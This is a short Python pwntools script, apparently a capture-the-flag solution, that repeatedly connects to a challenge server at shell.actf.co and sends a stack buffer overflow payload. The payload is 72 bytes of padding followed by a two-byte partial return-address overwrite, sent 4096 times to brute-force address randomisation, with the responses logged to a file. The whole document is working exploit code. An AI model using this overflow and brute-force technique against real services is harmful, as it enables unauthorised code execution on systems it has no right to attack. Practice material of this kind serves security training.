from pwn import *

log=''
for i in range(0x1000):
    p=remote('shell.actf.co',19306)
    p.recvuntil('want? ')
    p.sendline('A'*0x40+'B'*0x8+'\xa9\x11')
    p.recvuntil('one.\n')

    x=p.recvall()
    log += x
    p.close()

with open('log','w') as f:
    f.write(log)
f.close()
